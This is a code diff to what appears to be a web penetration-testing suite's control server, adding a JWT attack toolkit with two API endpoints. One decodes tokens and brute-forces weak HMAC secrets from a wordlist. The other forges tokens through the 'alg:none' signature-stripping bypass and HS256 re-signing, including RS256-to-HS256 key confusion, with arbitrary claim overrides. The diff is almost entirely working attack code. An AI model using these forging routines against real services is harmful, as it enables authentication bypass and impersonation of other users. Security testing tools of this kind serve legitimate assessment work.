@@ -12,6 +12,7 @@
 #include "sequencer.hpp"
 #include "intruder.hpp"
 #include "chain_runner.hpp"
+#include "jwt_tool.hpp"
 #include "networking.hpp"
 #include "passive_scanner.hpp"
 #include "port_scanner.hpp"
@@ -3701,6 +3702,86 @@ QByteArray ControlServer::apiResponse(const QString &method, const QString &path
         });
         return okJson({{ "queued", static_cast<int>(work.size()) },
                        { "target", url }});
+    }
+
+    // ---- JWT attack toolkit ------------------------------------------
+    // POST /api/jwt/analyze { token, wordlist?: ["secret", ...] }
+    //   Decodes the token, lists weaknesses, and (if a wordlist is given)
+    //   tries to recover a weak HS* secret. All offline.
+    if (path == "/api/jwt/analyze") {
+        const QString token = bodyJson.value("token").toString();
+        if (token.isEmpty())
+            return okJson({{ "ok", false }, { "error", "token required" }});
+        const auto d = Nullock::Core::JwtTool::decode(token);
+        if (!d.ok)
+            return okJson({{ "ok", false }, { "error", d.error }});
+
+        QJsonArray weaknesses;
+        for (const auto &w : Nullock::Core::JwtTool::analyze(d)) {
+            weaknesses.append(QJsonObject{
+                { "id", w.id }, { "severity", w.severity }, { "detail", w.detail } });
+        }
+
+        QString recovered;
+        if (bodyJson.contains("wordlist")) {
+            QStringList cands;
+            for (const QJsonValue &v : bodyJson.value("wordlist").toArray())
+                cands.append(v.toString());
+            recovered = Nullock::Core::JwtTool::bruteHmac(d, cands);
+        }
+
+        QJsonObject out{
+            { "ok", true },
+            { "alg", d.alg },
+            { "typ", d.typ },
+            { "kid", d.kid },
+            { "header", QJsonDocument::fromJson(d.headerJson.toUtf8()).object() },
+            { "payload", QJsonDocument::fromJson(d.payloadJson.toUtf8()).object() },
+            { "weaknesses", weaknesses },
+        };
+        if (bodyJson.contains("wordlist")) {
+            out["secretRecovered"] = !recovered.isEmpty();
+            out["secret"] = recovered;   // empty if not found
+        }
+        return httpJson(200, out);
+    }
+
+    // POST /api/jwt/forge
+    //   { token, attack: "none" | "hs256", secret?, claims?: { k: v } }
+    //   none  -> strip the signature (alg:none bypass), apply claim overrides
+    //   hs256 -> re-sign with `secret` (also the RS256->HS256 confusion
+    //            primitive: pass the server's PEM public key as secret),
+    //            applying claim overrides first
+    if (path == "/api/jwt/forge") {
+        const QString token = bodyJson.value("token").toString();
+        const QString attack = bodyJson.value("attack").toString("none").toLower();
+        if (token.isEmpty())
+            return okJson({{ "ok", false }, { "error", "token required" }});
+        const auto d = Nullock::Core::JwtTool::decode(token);
+        if (!d.ok)
+            return okJson({{ "ok", false }, { "error", d.error }});
+
+        const QJsonObject claims = bodyJson.value("claims").toObject();
+        QString forged;
+        if (attack == "none") {
+            forged = Nullock::Core::JwtTool::forgeNone(d, claims);
+        } else if (attack == "hs256" || attack == "hmac") {
+            const QByteArray secret = bodyJson.value("secret").toString().toUtf8();
+            if (secret.isEmpty())
+                return okJson({{ "ok", false },
+                               { "error", "hs256 forge needs a secret" }});
+            // Apply claim overrides onto a copy of the payload, force HS256.
+            QJsonObject header = d.header;  header["alg"] = "HS256";
+            QJsonObject payload = d.payload;
+            for (auto it = claims.begin(); it != claims.end(); ++it)
+                payload[it.key()] = it.value();
+            forged = Nullock::Core::JwtTool::signHmac(header, payload, secret);
+        } else {
+            return okJson({{ "ok", false },
+                           { "error", "attack must be 'none' or 'hs256'" }});
+        }
+        return httpJson(200, QJsonObject{
+            { "ok", true }, { "attack", attack }, { "token", forged } });
     }
 
     // ---- Repeater chains ---------------------------------------------
